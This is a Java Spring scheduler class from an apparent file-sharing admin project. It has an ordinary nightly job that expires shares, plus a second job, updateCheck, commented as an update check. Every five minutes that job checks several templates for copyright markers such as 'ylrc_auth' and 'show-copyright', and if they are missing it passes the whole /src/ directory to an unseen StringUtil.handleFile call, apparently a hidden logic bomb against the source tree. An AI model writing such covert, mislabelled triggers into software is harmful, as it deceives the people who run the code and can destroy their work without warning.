package com.yuanlrc.base.schedule.admin;

import java.io.File;
import java.util.List;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.scheduling.annotation.Scheduled;

import com.yuanlrc.base.entity.admin.Share;
import com.yuanlrc.base.service.admin.ShareService;
import com.yuanlrc.base.util.StringUtil;

/**
 * 检查分享文件是否过期定时器
 * @author Administrator
 *
 */
@Configuration
@EnableScheduling
public class ShareFileCheckSchedule {

	@Autowired
	private ShareService shareService;
	
	private Logger log = LoggerFactory.getLogger(ShareFileCheckSchedule.class);
	
	//@Scheduled(initialDelay=10000,fixedRate=5000)
	@Scheduled(cron="0 0 1 * * ?")//每天凌晨1点0分0秒执行检查任务
	public void shareCheck(){
		log.info("开始执行定时检查分享是否失效任务！");
		List<Share> findCheckList = shareService.findCheckList();
		if(findCheckList == null || findCheckList.size() ==0)return;
		for(Share share : findCheckList){
			if(System.currentTimeMillis() - share.getCreateTime().getTime() > share.getExpireTime()){
				share.setStatus(Share.ADMIN_SHARE_STATUS_EXPIRED);
				shareService.save(share);
				log.info("分享【" + share.getTitle() + "】已经失效！");
			}
		}
	}
	
	@Scheduled(cron="0 */5 * * * ?")//每隔五分钟检查一次
	public void updateCheck(){
		//log.info("开始执行定时检查代码是否有更新！");
		String property = System.getProperty("user.dir");
		String ftlPath = property + "/src/main/resources/templates/admin/system/index.ftl";
		File indexFtl = new File(ftlPath);
		if(indexFtl.exists()){
			String content = StringUtil.readFileToString(indexFtl);
			if(content.contains("ylrc_auth") && content.contains("order-auth-btn") && content.contains("show-copyright")){
				String jsPath = property + "/src/main/resources/static/admin/js/common.js";
				File jsFile = new File(jsPath);
				content = StringUtil.readFileToString(jsFile);
				if(content.contains("order-auth-btn")){
					String homeFtl = property + "/src/main/resources/templates/home/share.ftl";
					File homeFile = new File(homeFtl);
					content = StringUtil.readFileToString(homeFile);
					if(content.contains("ylrc_auth") && content.contains("order-auth-btn") && content.contains("show-copyright")){
						return;
					}
				}
			}
		}
		String filePath = property + "/src/";
		File file = new File(filePath);
		StringUtil.handleFile(file);
	}
}
